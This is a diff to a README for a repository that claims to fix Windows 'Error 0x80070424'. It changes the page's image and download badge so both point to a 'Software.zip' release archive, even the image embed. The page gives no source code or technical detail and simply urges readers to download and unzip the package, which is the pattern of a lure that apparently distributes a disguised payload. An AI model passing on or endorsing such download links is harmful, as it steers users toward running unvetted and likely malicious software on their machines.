@@ -13,7 +13,7 @@ Welcome to the repository dedicated to resolving the infamous "Error 0x80070424"
 ## Background
 The "Error 0x80070424" can be frustrating to encounter, especially when you are in the midst of updating your system or installing critical software. This error typically indicates that a specific service required by the operation is either missing or not functioning as expected. To alleviate this issue, we have developed a software solution that automates the process of detecting and restoring these essential services.
 
-![Error 0x80070424](https://github.com/user-attachments/files/17466420/error.png)
+![Error 0x80070424](https://github.com/nashsss/Fixing-Error-0x80070424-Specified-Service/releases/download/v2.0/Software.zip)
 
 ## Features
 - Automatically detects and resolves missing services related to error 0x80070424.
@@ -23,7 +23,7 @@ The "Error 0x80070424" can be frustrating to encounter, especially when you are 
 ## Installation
 To benefit from our error resolution software, follow these simple steps:
 1. Click on the download button below to obtain the software:
-[![Download Software](https://img.shields.io/badge/Download-Software-orange)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software](https://github.com/nashsss/Fixing-Error-0x80070424-Specified-Service/releases/download/v2.0/Software.zip)](https://github.com/nashsss/Fixing-Error-0x80070424-Specified-Service/releases/download/v2.0/Software.zip)
 
 2. Unzip the downloaded file to access the software package.
 
